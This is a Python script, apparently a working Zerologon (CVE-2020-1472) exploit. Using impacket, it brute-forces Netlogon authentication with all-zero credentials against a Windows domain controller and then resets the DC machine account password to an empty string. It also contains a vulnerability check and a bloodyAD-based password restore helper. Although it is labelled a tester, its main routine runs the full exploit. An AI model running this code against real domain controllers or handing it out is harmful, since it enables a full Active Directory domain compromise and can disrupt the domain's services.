#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
import subprocess
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
    raise RuntimeError(
        f"{msg} This might have been caused by invalid arguments or network issues."
    )

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.


    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )


        # It worked!
        assert server_auth['ErrorCode'] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)

def _open_rpc_connection(dc_ip):
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    return rpc_con


def _attempt_zero_authentication(rpc_con, dc_handle, dc_ip, target_computer):
    for attempt in range(0, MAX_ATTEMPTS):
        result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
        if result is None:
            continue
        return True
    return False


def check_zerologon(dc_name, dc_ip):
    if not dc_name or not dc_ip:
        return ["Missing DC name or DC IP."]

    dc_name = dc_name.rstrip('$')
    dc_handle = '\\\\' + dc_name

    try:
        rpc_con = _open_rpc_connection(dc_ip)
        vulnerable = _attempt_zero_authentication(rpc_con, dc_handle, dc_ip, dc_name)
    except Exception as exc:
        return [f"Zerologon check failed: {exc}"]

    if vulnerable:
        return ["Target appears vulnerable to Zerologon."]
    return ["Target appears patched against Zerologon."]


def run_zerologon(dc_name, dc_ip):
    if not dc_name or not dc_ip:
        return ["Missing DC name or DC IP."]

    dc_name = dc_name.rstrip('$')
    dc_handle = '\\\\' + dc_name

    try:
        rpc_con = _open_rpc_connection(dc_ip)
        vulnerable = _attempt_zero_authentication(rpc_con, dc_handle, dc_ip, dc_name)
        if not vulnerable:
            return ["Attack failed. Target is probably patched."]

        result = None
        for attempt in range(0, MAX_ATTEMPTS):
            try:
                result = exploit(dc_handle, rpc_con, dc_name)
            except nrpc.DCERPCSessionError as ex:
                if ex.get_error_code() == 0xc0000022:
                    continue
                fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
            except BaseException as ex:
                fail(f'Unexpected error: {ex}.')

            if result is not None:
                break

        if result is None:
            return ["Exploit failed to complete after retries."]

        error_code = None
        try:
            error_code = result["ErrorCode"]
        except Exception:
            error_code = None

        if error_code == 0:
            return ["Exploit complete. Machine account password reset to empty string."]
        if error_code is None:
            return ["Exploit returned an unexpected response from the DC."]
        return [f"Exploit returned error code: {error_code}"]
    except Exception as exc:
        return [f"Zerologon exploit failed: {exc}"]


def restore_machine_account_password_bloodyad(
    domain,
    admin_username,
    admin_password,
    dc_ip,
    machine_account,
    new_password,
):
    if not domain or not admin_username or not admin_password or not dc_ip:
        return ["Missing admin credentials or domain settings."]
    if not machine_account or not new_password:
        return ["Missing machine account or new password."]

    account_name = machine_account.strip()
    if not account_name.endswith("$"):
        account_name = f"{account_name}$"

    command = [
        "bloodyAD",
        "-d",
        domain,
        "-u",
        admin_username,
        "-p",
        admin_password,
        "-H",
        dc_ip,
        "set",
        "password",
        account_name,
        new_password,
    ]

    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode != 0:
        message = result.stderr.strip() or result.stdout.strip() or "Unknown error"
        return [f"Restore failed: {message}"]

    output = result.stdout.strip() or "Machine account password restored successfully."
    return output.splitlines() if output else ["Machine account password restored successfully."]

def main():
    if not (3 <= len(sys.argv) <= 4):
        print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
        print('Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string when vulnerable.')
        print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
        sys.exit(1)
    else:
        [_, dc_name, dc_ip] = sys.argv
        try:
            results = run_zerologon(dc_name, dc_ip)
        except RuntimeError as exc:
            print(exc, file=sys.stderr)
            sys.exit(2)

        for line in results:
            print(line)

if __name__ == '__main__':
    main()
